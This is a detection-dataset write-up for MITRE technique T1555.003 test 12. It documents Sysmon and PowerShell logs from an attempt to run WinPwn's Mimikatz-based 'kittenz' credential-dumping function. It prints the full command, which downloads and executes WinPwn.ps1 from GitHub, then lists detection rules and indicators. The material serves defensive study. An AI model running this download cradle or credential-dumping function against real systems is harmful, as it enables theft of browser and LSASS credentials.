# T1555.003-12: Credentials from Web Browsers — WinPwn - Loot Local Credentials - mimi-kittenz

## Technique Context

MITRE ATT&CK T1555.003 (Credentials from Web Browsers) encompasses credential dumping via offensive PowerShell frameworks. WinPwn's `kittenz` function is a PowerShell wrapper around Mimikatz-derived credential extraction logic targeting browser stores and local credential caches. Unlike `browserpwn` (test 11), which focuses on browser credential files, `kittenz` uses Mimikatz's `sekurlsa` and related modules to extract credentials from memory and local stores. This is a higher-privilege, more aggressive credential access function that may target LSASS in addition to browser credential databases.

## What This Dataset Contains

**Command executed (Security 4688 and Sysmon EID=1):**
```
"powershell.exe" & {iex(new-object net.webclient).downloadstring(
  'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive}
```

**PowerShell 4104 script blocks:**
- The `iex ... downloadstring(...)` invocation and `kittenz -consoleoutput -noninteractive` both captured verbatim, with the pinned WinPwn commit hash.

**Sysmon EID=22 (DNS Query):**
- DNS query for `raw.githubusercontent.com` resolved to the GitHub CDN (`185.199.108-111.133`), confirming the download request.

**Sysmon EID=3 (Network Connection):**
- Outbound TCP connection from `powershell.exe` to `185.199.111.133:443` — the actual HTTPS connection to download WinPwn.ps1. This is the clearest network indicator in this dataset.

**Sysmon EID=1 (Process Create):**
- `whoami.exe` (T1033), child `powershell.exe` (T1059.001).

**Sysmon EID=10 (Process Access):**
- Parent PowerShell accessing child process handles — T1055.001 heuristic.

**Exit codes:** All `0x0`.

## What This Dataset Does Not Contain (and Why)

**LSASS process access:** Although `kittenz` can target LSASS, no EID=10 event targeting `lsass.exe` appears. Windows Defender's behavior monitoring blocks Mimikatz-pattern LSASS access with access denied (`0xC0000022`). Either AMSI intercepted the script before it reached the LSASS access phase, or Defender's real-time protection prevented the handle open. No `0xC0000022` appears in the security log because object access auditing is disabled in this environment.

**Credential output files:** No EID=11 events show credential dump files written to disk. The function did not complete successfully.

**Difference from test 11 (BrowserPwn):** Both tests use the same `iex ... WinPwn.ps1` download cradle. Test 11 calls `browserpwn`, test 12 calls `kittenz`. The telemetry structure is nearly identical. The distinguishing element is the function name in the script block and the more aggressive credential access intent of `kittenz`.

**Note on EID=3 source:** In test 11, the network connection was attributed to `MsMpEng.exe` (Defender cloud lookup); in this test, the connection appears from `powershell.exe` directly. The difference suggests that in this execution Defender's cloud scan happened slightly after the download began, or at a different point in script evaluation. Both patterns are genuine.

## Assessment

This dataset, like test 11, documents a WinPwn execution attempt that was intercepted before meaningful credential extraction. The value is the download cradle telemetry — specifically the Sysmon EID=3 showing `powershell.exe` making an outbound HTTPS connection to GitHub, combined with the 4104 script block showing `iex ... downloadstring`. The `kittenz` function name in the script block provides threat intelligence context distinguishing this from the `browserpwn` variant.

## Detection Opportunities Present in This Data

- **PowerShell 4104** contains `iex(new-object net.webclient).downloadstring(...)` with the WinPwn URL — highest-fidelity detection signal; the string `kittenz` in the same block identifies the specific module.
- **Sysmon EID=3** showing `powershell.exe` connecting to `185.199.111.133:443` (GitHub CDN) in a SYSTEM context is anomalous — PowerShell does not normally make outbound HTTPS connections as SYSTEM for legitimate purposes.
- **Sysmon EID=22 (DNS)** for `raw.githubusercontent.com` from PowerShell running as SYSTEM is a behavioral indicator regardless of the specific domain.
- **Security 4688** captures the `iex ... kittenz` command line.
- Correlation rule: PowerShell as SYSTEM + outbound connection to `raw.githubusercontent.com` or `github.com` + script block containing `iex` = high-priority alert.
- The WinPwn commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` is a threat intelligence indicator for this specific version; hash the downloaded script for hunting.
